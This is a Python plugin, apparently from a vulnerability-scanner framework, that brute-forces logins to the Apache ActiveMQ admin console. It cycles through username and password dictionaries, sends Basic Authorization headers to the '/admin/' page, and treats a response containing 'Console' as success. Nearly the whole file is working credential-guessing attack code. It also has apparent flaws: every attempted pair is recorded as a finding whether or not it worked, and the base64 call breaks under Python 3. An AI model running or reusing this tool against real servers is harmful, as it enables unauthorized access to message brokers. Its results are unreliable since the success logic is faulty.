#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'

from base64 import b64encode, b64decode

def info(data=None):
    info = {
        "name": "Acticemq burst",
        "info": "acticemq burst.",
        "level": "high",
        "type": "weakpass",
    }
    return info



def prove(data):
    data = init(data, 'web')
    if data['base_url']:
        usernamedic = _read_dic(data['dic_one']) if 'dic_one' in data.keys() else  _read_dic('dict/activemq_usernames.txt')
        passworddic = _read_dic(data['dic_two']) if 'dic_two' in data.keys() else  _read_dic('dict/activemq_passwords.txt')
        url = data['base_url'] + "admin/"
        for linef1 in usernamedic:
            username = linef1.strip('\r').strip('\n')
            for linef2 in passworddic:
                try:
                    password = (
                        linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                        '\r').strip('\n')
                    key = b64encode(":".join([username,password]))
                    data['headers']["Authorization"] = 'Basic %s' % key
                    res = curl('get',url)
                    if 'Console' in res.text:
                        data['flag'] = 1
                    data['data'].append({"username": username,"password":password})
                    data['res'].append({"info": username + "/" + password, "key": "Authorization: " + key})
                except Exception:
                    pass
    return data




def _read_dic(dicname):
    with open(dicname, 'r') as f:
        return f.readlines()